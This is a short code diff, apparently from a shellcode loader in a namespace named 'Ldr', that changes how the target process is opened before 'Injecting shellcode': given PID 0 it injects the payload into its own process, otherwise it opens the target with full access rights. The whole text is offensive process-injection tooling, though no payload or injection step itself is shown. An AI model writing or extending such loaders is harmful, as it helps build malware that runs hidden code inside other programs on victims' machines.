@@ -56,11 +56,17 @@ namespace Ldr
     {
         printf("[i] Injecting shellcode...\n");
 
-        HANDLE hProcess = OpenProcess(
-            PROCESS_ALL_ACCESS,
-            FALSE,
-            dwPID
-        );
+        HANDLE hProcess = 0;
+        if (dwPID == 0){
+                printf("[*] User input PID 0 will inject the payload to self\n");
+                hProcess = GetCurrentProcess();
+        }else{
+                hProcess = OpenProcess(
+                PROCESS_ALL_ACCESS,
+                FALSE,
+                dwPID
+                );
+        }
         if (!hProcess)
         {
             printf("[x] Failed to open process: <ERROR_CODE: %ld>\n", GetLastError());
